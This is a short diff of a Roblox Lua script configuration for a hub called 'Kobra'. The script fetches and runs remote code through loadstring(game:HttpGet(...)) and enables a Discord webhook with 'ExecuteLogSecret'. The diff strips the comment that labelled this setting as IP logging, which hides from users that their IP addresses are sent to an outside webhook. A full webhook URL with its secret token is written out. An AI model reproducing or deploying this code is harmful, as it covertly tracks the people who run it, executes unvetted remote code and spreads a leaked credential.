@@ -2,8 +2,8 @@ local ApiFTAP = loadstring(game:HttpGet("https://raw.githubusercontent.com/Oxwoe
 
 ApiFTAP:SetSettings({
     NameHub = "Kobra",
-    WebhookEnabled = true, -- Enable/Disable
-    ExecuteLogSecret = true, -- IP logging
+    WebhookEnabled = true,
+    ExecuteLogSecret = true,
     WebhookLink = "https://discord.com/api/webhooks/1364446921791508480/QAEuLmPSu1addaZY1gI3ljXlV6fmSZq1gmvHmRN81nIjTIjKfzOJpBMXnOOA5SLaSBC5"
 })
 -- SetSettings(settings: table)
